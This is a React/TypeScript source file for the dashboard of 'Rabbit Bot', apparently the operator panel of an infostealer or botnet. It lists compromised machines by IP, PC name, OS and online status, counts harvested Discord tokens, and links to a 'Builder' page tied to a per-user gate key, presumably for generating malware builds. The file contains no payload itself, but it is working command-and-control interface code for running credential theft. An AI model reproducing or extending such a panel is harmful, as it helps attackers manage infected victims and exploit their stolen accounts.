import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { Bot, Settings as SettingsIcon, LogOut, Globe, Hammer } from 'lucide-react';
import { socket } from '../../socket';
import { API_BASE_URL } from '../../config';
import './Dashboard.css';
import logoImg from '../../assets/logo.png';

import { Bots } from '../Bots/Bots';
import { Discord } from '../Discord/Discord';
import { Settings } from '../Settings/Settings';
import { Builder } from '../Builder/Builder';

import { NetworkBackground } from '../NetworkBackground/NetworkBackground';
import { useLanguage, LANGUAGES } from '../../i18n/LanguageContext';

// Custom SVG Discord Icon
const DiscordIcon = ({ size = 18 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="currentColor">
    <path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515a.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0a12.64 12.64 0 0 0-.617-1.25a.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057a19.9 19.9 0 0 0 5.993 3.03a.078.078 0 0 0 .084-.028a14.09 14.09 0 0 0 1.226-1.994a.076.076 0 0 0-.041-.106a13.107 13.107 0 0 1-1.872-.892a.077.077 0 0 1-.008-.128a10.2 10.2 0 0 0 .372-.292a.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.061 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127a12.299 12.299 0 0 1-1.873.892a.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028a19.839 19.839 0 0 0 6.002-3.03a.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.028zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.956-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419c0-1.333.955-2.419 2.157-2.419c1.21 0 2.176 1.096 2.157 2.42c0 1.333-.946 2.418-2.157 2.418z"/>
  </svg>
);

interface UserData {
  id: number;
  username: string;
  role: string;
  gateKey: string;
}

interface BotItem {
  id: number;
  device_key?: string;
  ip: string;
  port: number;
  pc_name: string;
  os_info: string;
  status: 'online' | 'offline';
  last_seen: string;
}

interface DashboardProps {
  user: UserData;
  onLogout: () => void;
}

type PageType = 'bots' | 'discord' | 'settings' | 'builder';

export const Dashboard: React.FC<DashboardProps> = ({ user, onLogout }) => {
  const { language, setLanguage, t } = useLanguage();
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [page, setPage] = useState<PageType>(() => {
    const saved = localStorage.getItem('activeTab') as PageType;
    return (saved === 'bots' || saved === 'discord' || saved === 'settings' || saved === 'builder') ? saved : 'bots';
  });
  const [bots, setBots] = useState<BotItem[]>([]);
  const [selectedPcFilter, setSelectedPcFilter] = useState<string | null>(null);

  const currentLangObj = LANGUAGES.find(l => l.code === language) || LANGUAGES[0];

  useEffect(() => {
    const closeDropdown = () => setLangMenuOpen(false);
    if (langMenuOpen) {
      window.addEventListener('click', closeDropdown);
    }
    return () => window.removeEventListener('click', closeDropdown);
  }, [langMenuOpen]);

  const handlePageChange = (newPage: PageType) => {
    setPage(newPage);
    localStorage.setItem('activeTab', newPage);
    if (newPage !== 'discord') {
      setSelectedPcFilter(null);
    }
  };

  const [discordTokenCount, setDiscordTokenCount] = useState<number>(0);

  useEffect(() => {
    const fetchBots = async () => {
      try {
        const token = localStorage.getItem('token');
        const res = await axios.get(`${API_BASE_URL}/api/bots`, {
          headers: { Authorization: `Bearer ${token}` }
        });
        if (res.data.success) setBots(res.data.bots);
      } catch (_) {}
    };

    const fetchDiscordTokens = async () => {
      try {
        const token = localStorage.getItem('token');
        const res = await axios.get(`${API_BASE_URL}/api/discord`, {
          headers: { Authorization: `Bearer ${token}` }
        });
        if (res.data.success) setDiscordTokenCount(res.data.tokens.length);
      } catch (_) {}
    };

    fetchBots();
    fetchDiscordTokens();

    socket.on(`bots_update_${user.id}`, (updatedBots: BotItem[]) => {
      setBots(updatedBots);
    });

    const handleTokensUpdate = (newTokensList: any[]) => {
      setDiscordTokenCount(newTokensList.length);
    };

    socket.on('discord_tokens_update', handleTokensUpdate);
    socket.on(`discord_tokens_update_${user.id}`, handleTokensUpdate);

    return () => { 
      socket.off(`bots_update_${user.id}`); 
      socket.off('discord_tokens_update', handleTokensUpdate);
      socket.off(`discord_tokens_update_${user.id}`, handleTokensUpdate);
    };
  }, [user.id]);

  return (
    <div className="dashboard-layout">
      <NetworkBackground />
      <aside className="sidebar">
        <div>
          <div className="sidebar-header">
            <img src={logoImg} alt="Rabbit Bot Logo" className="sidebar-logo" />
          </div>
          <div className="sidebar-menu">
            <div className={`menu-item ${page === 'bots' ? 'active' : ''}`} onClick={() => handlePageChange('bots')}>
              <div className="menu-item-left"><Bot size={18} /><span>{t('sidebar.bots')}</span></div>
              {bots.length > 0 && <span className="sidebar-badge">{bots.length}</span>}
            </div>
            <div className={`menu-item ${page === 'discord' ? 'active' : ''}`} onClick={() => handlePageChange('discord')}>
              <div className="menu-item-left"><DiscordIcon size={18} /><span>{t('sidebar.discord')}</span></div>
              {discordTokenCount > 0 && <span className="sidebar-badge">{discordTokenCount}</span>}
            </div>
            <div className={`menu-item ${page === 'builder' ? 'active' : ''}`} onClick={() => handlePageChange('builder')}>
              <div className="menu-item-left"><Hammer size={18} /><span>{t('sidebar.builder')}</span></div>
            </div>
            <div className={`menu-item ${page === 'settings' ? 'active' : ''}`} onClick={() => handlePageChange('settings')}>
              <div className="menu-item-left"><SettingsIcon size={18} /><span>{t('sidebar.settings')}</span></div>
            </div>
          </div>
        </div>
        <div className="sidebar-footer">
          {/* ÖZEL ŞIK SİYAH DİL SEÇİM MENÜSÜ */}
          <div className="custom-lang-dropdown" onClick={(e) => e.stopPropagation()}>
            <button
              type="button"
              className="custom-lang-btn"
              onClick={() => setLangMenuOpen(prev => !prev)}
            >
              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
                <img src={currentLangObj.flag} alt={currentLangObj.name} className="lang-flag-img" />
                <span className="lang-name">{currentLangObj.name}</span>
              </div>
              <span className={`lang-arrow ${langMenuOpen ? 'open' : ''}`}>▲</span>
            </button>

            {langMenuOpen && (
              <div className="custom-lang-menu">
                {LANGUAGES.map((l) => (
                  <div
                    key={l.code}
                    className={`custom-lang-item ${language === l.code ? 'active' : ''}`}
                    onClick={() => {
                      setLanguage(l.code);
                      setLangMenuOpen(false);
                    }}
                  >
                    <img src={l.flag} alt={l.name} className="lang-flag-img" />
                    <span className="lang-name">{l.name}</span>
                    {language === l.code && <span className="lang-check">✓</span>}
                  </div>
                ))}
              </div>
            )}
          </div>

          <button className="btn-logout" onClick={onLogout}>
            <LogOut size={16} /> {t('sidebar.logout')}
          </button>
        </div>
      </aside>

      <main className="main-content">
        <div style={{ display: page === 'bots' ? 'block' : 'none' }}>
          <Bots bots={bots} userId={user.id} />
        </div>
        <div style={{ display: page === 'discord' ? 'block' : 'none' }}>
          <Discord filterPcName={selectedPcFilter} userId={user.id} />
        </div>
        <div style={{ display: page === 'builder' ? 'block' : 'none' }}>
          <Builder gateKey={user.gateKey} />
        </div>
        <div style={{ display: page === 'settings' ? 'block' : 'none' }}>
          <Settings userId={user.id} gateKey={user.gateKey} />
        </div>
      </main>
    </div>
  );
};


